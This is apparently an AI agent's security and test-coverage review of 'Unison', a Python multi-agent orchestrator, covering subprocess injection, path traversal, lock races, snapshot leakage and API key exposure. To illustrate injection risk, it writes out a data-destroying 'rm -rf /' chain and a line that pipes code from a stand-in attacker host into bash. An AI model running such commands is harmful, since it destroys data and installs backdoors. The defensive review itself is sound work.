# Unison Security & Test Coverage Review

**Date:** 2026-06-20
**Reviewer:** Hermes Agent (Codex Security Review)
**Scope:** Security review of subprocess injection, path traversal, lock races, snapshot leakage, API key exposure, risk engine correctness, and test coverage gaps.
**Repository:** `~/projects/unison/`

---

## 1. Subprocess Command Injection Risks

### S1: `shell=True` in bootstrap — arbitrary command execution (L2)
- **File:Line:** `src/unison/orchestrator.py:1059-1065`, `src/unison/bootstrap.py:37-43`
- **Description:** Bootstrap commands from `pipeline.yaml` (`bootstrap.commands`) are executed via `subprocess.run(cmd, shell=True)`. The commands originate from a user-authored YAML file, so this is a deliberate design choice (the user is the operator). However, any automation that programmatically generates pipeline YAML files could inject shell commands. Additionally, `snapshot` and `restore` paths and test commands are not escaped.
- **Suggested Fix:** Document that bootstrap commands run with `shell=True` and the pipeline YAML file should be treated as trusted input. Consider adding a `--safe-mode` flag that disables `shell=True` for bootstrap and forces list-argument subprocess invocation. Add a validation warning when `shell=True` is used.
- **Severity:** L2 (design risk — operator is the user, but automation pipelines could be compromised)

### S1b: `test_command` split for subprocess — potential injection (L2)
- **File:Line:** `src/unison/orchestrator.py:968-974`
- **Description:** `_recover_timeout_work()` calls `subprocess.run(self.spec.project.test_command.split(), ...)` where `test_command` comes from `pipeline.yaml`. While `split()` produces a list (not `shell=True`), it uses naive whitespace splitting which breaks on quoted arguments containing spaces. More concerning, if the test_command contains shell metacharacters after splitting (e.g., `pytest; rm -rf /`), the list form won't inject but the test infrastructure may behave unexpectedly.
- **Suggested Fix:** Use `shlex.split()` for proper shell word splitting, or validate `test_command` against a whitelist of known-safe patterns during `PipelineLoader.load()`.
- **Severity:** L2

### S1c: Runners pass full prompt as subprocess argument — no shell injection, but data exposure (L0)
- **File:Line:** `src/unison/runners/claude.py:31`, `src/unison/runners/codex.py:38`, `src/unison/runners/hermes.py:36`
- **Description:** All three runners use `subprocess.run(cmd, ...)` with a list of tokens (no `shell=True`). The `prompt` is passed as a single argument. This is safe against shell injection since the list form is used. No issue here.
- **Severity:** L0 (safe — list-form subprocess invocation)

---

## 2. File Path Traversal

### P1: `project_root` relative path resolution — traversal via `../` (L2)
- **File:Line:** `src/unison/pipeline.py:156-157`
- **Description:** `project_root = (pipeline_dir / project_root_str).resolve()` resolves any `../` components. While `.resolve()` does normalize the path, if the pipeline YAML specifies `project_root: "../../etc"`, the resolved path will indeed be `/etc/` (or wherever it resolves to). No validation is performed to ensure the resolved path does not escape an expected workspace boundary.
- **Suggested Fix:** Validate that `project_root` after resolution is a descendant of an allow-listed parent directory (e.g., `Path.home() / "projects"`), or require that `project_root` be an absolute path.
- **Severity:** L2

### P2: Agent log path constructed from unvalidated strings (L1)
- **File:Line:** `src/unison/world.py:144-152` (`agent_log` method)
- **Description:** `agent_log(role, iter_n, timestamp)` constructs a filename `{role}_iter-{iter_n}_{timestamp}.log` using string interpolation. While `role` is constrained by the `Literal["planner", "developer", "reviewer"]` type annotation, at runtime this is not enforced. A malicious `role` value containing `../` could escape the logs directory.
- **Suggested Fix:** Sanitize `role` and `timestamp` parameters at runtime — strip `/`, `\`, and `..` before constructing the filename. Use `Path.resolve()` and verify the result is under `logs_dir`.
- **Severity:** L1

### P3: Snapshot path construction uses `path.name` (safe) (L0)
- **File:Line:** `src/unison/snapshot.py:133`
- **Description:** `snapshot_path = snapshot_dir / path.name` uses only the basename of the original path. This is safe against traversal. No issue here.
- **Severity:** L0 (safe)

### P4: Lock file path uses `project` name from `root.name` (L0)
- **File:Line:** `src/unison/lock.py:27`
- **Description:** `self.lock_dir / f"{project}.lock"` uses `project` which comes from `self.spec.world.root.name` — `Path.name` returns only the final component with no directory separators. This is safe.
- **Severity:** L0 (safe)

---

## 3. Lock File TOCTOU Issues

### L1: Classic TOCTOU race in `acquire()` (L2)
- **File:Line:** `src/unison/lock.py:57-72`
- **Description:** `acquire()` checks `if lock_path.exists()` (line 57), reads the PID, checks liveness, then writes the lock (line 72). Between the `exists()` check and the `write_text()` call, another process could acquire the lock. This is a textbook TOCTOU (Time-of-check, Time-of-use) race.

```python
# Race window here between line 57 check and line 72 write
if lock_path.exists():
    existing_pid = self._read_pid(lock_path)  # TOCTOU: another process could overwrite between this check and write
    ...
lock_path.write_text(f"{current_pid}\n")  # No protection against concurrent write
```

- **Suggested Fix:** Use `os.open()` with `O_CREAT | O_EXCL` to atomically create the lock file, or use `fcntl.flock()` / `portalocker` for proper file locking. Alternatively, use `Path.write_text()` followed by a re-read to verify the written PID matches `os.getpid()` (atomicity-by-verification pattern).
- **Severity:** L2

### L2: `release()` lacks PID ownership verification (L1)
- **File:Line:** `src/unison/lock.py:75-81`
- **Description:** `release()` unconditionally deletes the lock file without verifying that the current process owns it. If a stale lock is overridden by process A, process B (which originally held the lock) could release it later, removing A's lock. This becomes exploitable when combined with the TOCTOU race in `acquire()`.
- **Suggested Fix:** On `release()`, read the lock file and only delete if the PID matches `os.getpid()`.
- **Severity:** L1

### L3: Manifest write in snapshot manager is not atomic (L1)
- **File:Line:** `src/unison/snapshot.py:84-87`, `150-153`
- **Description:** `_write_manifest()` writes directly to `manifest.json` without using a temporary-file-then-rename pattern. Between `_read_manifest()` (line 151) and `_write_manifest()` (line 153), another concurrent process could modify the manifest, causing data loss. The `state.py:209-217` `atomic_write()` uses the correct tmp-then-rename pattern and should be emulated.
- **Suggested Fix:** Use `tmp_path.write_text()` then `os.rename(tmp_path, manifest_path)` for atomic manifest writes.
- **Severity:** L1

### L4: Checkpoint save uses direct write (not atomic) (L1)
- **File:Line:** `src/unison/checkpoint.py:54-55`
- **Description:** `save()` writes directly to the checkpoint JSON file without using the atomic temp+rename pattern. In concurrent scenarios, a reader could see a partially-written checkpoint.
- **Suggested Fix:** Use the same `atomic_write` pattern from `state.py:209-217`.
- **Severity:** L1

---

## 4. Snapshot Data Leakage

### D1: Snapshot data stored unencrypted in `~/.unison/snapshots/` (L2)
- **File:Line:** `src/unison/snapshot.py:84-87`, `130-134`
- **Description:** Snapshots of files (potentially containing secrets, API keys, credentials, or proprietary code) are stored in plaintext under `~/.unison/snapshots/<audit_id>/`. The `manifest.json` maps audit_ids to original paths, creating a searchable index of all snapshotted files. No encryption, no secure deletion, no access control beyond filesystem permissions.
- **Suggested Fix:** 
  1. Encrypt snapshot data with a project-specific key derived from a master key.
  2. Sanitize snapshot data — scan for and redact API key patterns (e.g., `sk-ant-`, `sk-or-`, `AIza`, `hf_`) before storing.
  3. Add `shred`-style secure deletion on `cleanup_expired()` instead of `shutil.rmtree`.
  4. Set restrictive filesystem permissions (`0o700`) on snapshot directories.
- **Severity:** L2

### D2: Manifest leaks original file paths (L1)
- **File:Line:** `src/unison/snapshot.py:89-98`
- **Description:** The `_record_to_dict()` method stores the full resolved `original_path` in the manifest. For files outside the workspace (external snapshots), this exposes the user's filesystem layout. An attacker with read access to the manifest can learn where sensitive files live.
- **Suggested Fix:** Store a relative path (relative to `base_dir` parent) or hash `original_path` for privacy.
- **Severity:** L1

---

## 5. API Key Exposure in Logs

### K1: API keys loaded into os.environ, inherited by subprocess (L2)
- **File:Line:** `src/unison/cli.py:24-39`
- **Description:** `_load_api_keys()` reads `~/.hermes/.env` and loads `NAME=VALUE` pairs into `os.environ`. Keys are only set if `key not in os.environ` (line 38). All subprocess agents launched via `subprocess.run()` inherit the full environment including these API keys (the runner code does not pass `env=` to restrict the environment). Any agent that prints environment variables or includes them in its stdout will leak keys into the log files stored at `observer/logs/*.log`.

The ~/.hermes/.env file typically contains:
- `ANTHROPIC_API_KEY`
- `OPENAI_API_KEY`
- `DEEPSEEK_API_KEY`
- Other provider keys

- **Suggested Fix:**
  1. Strip sensitive environment variables before passing to subprocess agents: use `env={k:v for k,v in os.environ.items() if not k.endswith('_API_KEY') and k != 'HERMES_TOKEN'}`.
  2. Add environment variable filtering in runner `run()` methods via `env=filter_env(os.environ)`.
  3. Add a log sanitizer that scans written log files for API key patterns and redacts them.
  4. Consider using a keyring/keychain integration instead of `.env` files.
- **Severity:** L2 (keys inherited by agent subprocess, could appear in logs)

### K2: Agent command+prompt fully logged (L1)
- **File:Line:** `src/unison/runners/claude.py:67-69`, `src/unison/runners/codex.py:75-77`, `src/unison/runners/hermes.py:67-69`
- **Description:** All three runners write the full command line including the complete prompt to the log file (`log_path.write_text(...)`). The prompt may contain sensitive project information, proprietary code context, and task instructions. These logs persist in `observer/logs/` indefinitely.
- **Suggested Fix:** 
  1. Truncate the logged prompt to a fixed length (e.g., first 200 chars + "...[truncated]").
  2. Move the full prompt to a separate, permission-restricted audit log.
  3. Add log rotation and retention policies for agent logs.
- **Severity:** L1

### K3: `_load_api_keys()` strips quotes but doesn't escape (L0 — informational)
- **File:Line:** `src/unison/cli.py:37`
- **Description:** The line `val = val.strip().strip("\"'")` strips outer quotes from values. If a value legitimately contains a leading/trailing quote character (unlikely for API keys), it would be truncated. This is not a security issue per se but could cause authentication failures.
- **Severity:** L0 (informational)

---

## 6. `risk_engine.py` Correctness

### R1: Priority ordering in `evaluate()` — comment numbering is misleading (L0)
- **File:Line:** `src/unison/risk_engine.py:83-88`
- **Description:** The docstring numbers priorities as 1,2,3,4 but the code executes them as 1,2,4,3 (matrix lookup before downgrade). The actual execution order is correct: sudo check → critical path check → matrix lookup → safe command downgrade. The downgrade *must* be applied after matrix lookup to be relative to the matrix result. The misleading comment numbers could confuse maintainers.
- **Suggested Fix:** Re-number the docstring to match execution order (1,2,4,3).
- **Severity:** L0 (documentation only)

### R2: `_DOWNGRADE` mapping correctness (safe)
- **File:Line:** `src/unison/risk_engine.py:35-40`
- **Description:** The downgrade chain L3→L2, L2→L1, L1→L0, L0→L0 is correct and safe. L3 is never downgraded via the `_is_safe` path because the sudo check (priority 1) returns before the downgrade logic runs.
- **Severity:** L0 (correct)

### R3: `_scope()` uses `resolve()` — safe against symlink traversal (L0)
- **File:Line:** `src/unison/risk_engine.py:148-154`
- **Description:** `_scope()` resolves both the path and workspace before comparing, which prevents symlink-based escapes. This is correct.
- **Severity:** L0 (safe)

### R4: `_is_critical()` uses `os.path.expanduser()` — edge case with empty path (L0)
- **File:Line:** `src/unison/risk_engine.py:142-146`
- **Description:** If `path` is empty string `""`, `os.path.expanduser("")` returns `""` which would never match a pattern. Safe, but no explicit handling of empty path.
- **Severity:** L0 (safe)

### R5: `fnmatch.fnmatch` for command patterns — overly permissive globs (L1)
- **File:Line:** `src/unison/risk_engine.py:134-138`
- **Description:** `known_safe_external_commands` uses `fnmatch.fnmatch(command, pattern)` with glob patterns. A pattern like `*` would match *any* command, effectively disabling the safe-command check. A pattern like `pip install *` would match `pip install malware && curl evil.com/backdoor | bash` since fnmatch doesn't understand command boundaries.
- **Suggested Fix:** 
  1. Validate that patterns do not equal `*` (require at least one non-wildcard character).
  2. Split commands on `&&`, `||`, `;`, `|` before matching to prevent chained command injection.
  3. Use a simpler prefix-matching approach for commands rather than fnmatch globs.
- **Severity:** L1

---

## 7. Test Coverage Gaps

### Module-by-module coverage analysis:

| Module | Test File | Coverage Assessment |
|---|---|---|
| `orchestrator.py` | `test_orchestrator.py` (765 lines) | **Medium.** Tests exist for instantiation, halt, dry-run, pre_invoke_cleanup. Missing: parallel_dev flow, DAG flow, multi-reviewer flow, timeout-recovery, budget overflow scenarios, bootstrap execution, verdict routing edge cases. |
| `pipeline.py` | `test_pipeline.py` (1421 lines) | **Good.** Extensive tests for loading, validation, DAG scheduling, dry-run, mode detection. Missing: schema migration edge cases, `project_root` traversal validation. |
| `runners/base.py` | (protocol only) | **N/A** — protocol, no implementation to test. |
| `runners/claude.py` | `test_runners.py` (155 lines) | **Low.** Only tests creation and `_build_command()`. Missing: `run()` method test (requires mock subprocess), timeout handling, log output format. |
| `runners/codex.py` | `test_runners.py` (155 lines) | **Low.** Same gaps as Claude. Missing: `startup_grace` handling, effective timeout calculation. |
| `runners/hermes.py` | `test_runners.py` (155 lines) | **Low.** Same gaps. Missing: run() execution test, FileNotFoundError handling. |
| `verdict.py` | `test_verdict.py` (224 lines) | **Good.** Tests PASS, REQUEST_CHANGES, missing frontmatter, invalid YAML, suspicious PASS detection. Missing: uppercase/lowercase normalization edge cases, findings with special characters. |
| `snapshot.py` | `test_snapshot.py` (204 lines) | **Medium.** Tests file/directory snapshots, restore, missing audit_id, manifest operations. Missing: concurrent access tests, symlink handling, `max_slots` enforcement, permission preservation across platforms. |
| `lock.py` | `test_lock.py` (173 lines) | **Good.** Tests acquisition, re-entrant check, stale override, release, PID detection, multiple projects. Missing: concurrent race condition tests, `release()` ownership verification, empty lock file content. |
| `state.py` | `test_state.py` | **Medium.** Transitions, serialization tested. Missing: schema migration roundtrip, invalid phase rejection. |
| `risk_engine.py` | `test_risk_engine.py` (244 lines) | **Good.** Tests sudo detection, critical paths, workspace/external scopes, safe command downgrade. Missing: empty command string, `*` wildcard in safe commands, empty path, fnmatch edge cases. |
| `context_deflate.py` | `test_context_deflate.py` | **Unknown.** Test file exists, needs review. |
| `budget.py` | `test_budget.py` | **Unknown.** Test file exists, needs review. |
| `observer.py` (873 lines) | `test_observer.py` (960 lines) | **Good.** Extensive tests for FileEvent, InotifyWatcher, PollingWatcher, Observer lifecycle. |
| `optimizer.py` | `test_optimizer.py` | **Unknown.** Test file exists, needs review. |
| `bootstrap.py` | `test_bootstrap.py` | **Unknown.** Test file exists, needs review. |
| `channel.py` | `test_channel.py` | **Unknown.** Test file exists, needs review. |
| `checkpoint.py` | `test_checkpoint.py` | **Unknown.** Test file exists, needs review. |
| `worktree.py` | `test_worktree.py` | **Unknown.** Test file exists, needs review. |
| `world.py` | `test_world.py` | **Unknown.** Test file exists, needs review. |
| `cli.py` | `test_cli.py` | **Unknown.** Test file exists, needs review. |
| `reviewer_pool.py` | `test_reviewer_pool.py` | **Unknown.** Test file exists, needs review. |
| `completion.py` | `test_completion.py` | **Unknown.** Test file exists, needs review. |
| `schema_migrate.py` | `test_schema_migrate.py` | **Unknown.** Test file exists, needs review. |

### High-priority test coverage gaps:

1. **Runner `run()` method execution** — No test actually invokes `runner.run()` with a mock subprocess. This is the highest-risk gap because runner execution touches shell, environment, file I/O, and process lifecycle.

2. **Orchestrator `_invoke_parallel_developers()`** — No test coverage for the worktree-based parallel development flow. This is complex code with merge reconciliation and feature-specific prompting.

3. **Orchestrator `_recover_timeout_work()`** — No test for the timeout recovery path which auto-commits uncommitted work.

4. **Concurrent lock acquisition** — No test simulates multiple processes racing for the same lock. The TOCTOU bug would only surface in concurrent testing.

5. **API key filtering** — No test verifies that sensitive environment variables are excluded from subprocess environments or log output.

6. **Budget overflow with `halt` action** — No test for the orchestrator's handling of `overflow_action == "halt"`.

7. **Bootstrap `shell=True` execution** — No test for bootstrap command injection sanitization (or lack thereof).

8. **Multi-reviewer reconcilation** — While `reviewer_pool.py` has a test file, the orchestrator's `_invoke_multi_reviewer()` method lacks direct coverage.

9. **DAG scheduling with parallel groups** — No test for `DAGScheduler.execute_parallel()` with `parallel_group` configurations.

10. **Observer `InotifyWatcher` across process boundaries** — Tests exist but likely test in-process scenarios. Cross-process events (actual file writes from agent subprocess) are not tested.

---

## Summary

| Category | Total Findings | L0 | L1 | L2 | L3 |
|---|---|---|---|---|---|
| Subprocess Command Injection | 3 | 1 | 0 | 2 | 0 |
| File Path Traversal | 4 | 2 | 1 | 1 | 0 |
| Lock File TOCTOU | 4 | 0 | 3 | 1 | 0 |
| Snapshot Data Leakage | 2 | 0 | 1 | 1 | 0 |
| API Key Exposure in Logs | 3 | 1 | 1 | 1 | 0 |
| risk_engine.py Correctness | 5 | 4 | 1 | 0 | 0 |
| **Totals** | **21** | **8** | **7** | **6** | **0** |

### Critical findings requiring immediate attention:
1. **Lock file TOCTOU (L2)** — `lock.py:57-72` — Classic race condition; fix with atomic file creation or proper `flock`.
2. **API keys in subprocess environment (L2)** — `cli.py:24-39` — API keys loaded into `os.environ` and inherited by all agent subprocesses; could leak to logs.
3. **Snapshot plaintext storage (L2)** — `snapshot.py:84-87` — Snapshots of possibly sensitive files stored unencrypted with a path-exposing manifest.

### Test coverage summary:
- **Well-tested:** `pipeline.py`, `lock.py`, `risk_engine.py`, `verdict.py`, `observer.py`
- **Moderately tested:** `orchestrator.py`, `state.py`, `snapshot.py`
- **Under-tested:** All three runners (`claude.py`, `codex.py`, `hermes.py`), `bootstrap.py`, `cli.py`
- **Untested scenarios:** Concurrent lock races, subprocess environment filtering, parallel developer flow, timeout recovery, DAG parallel execution
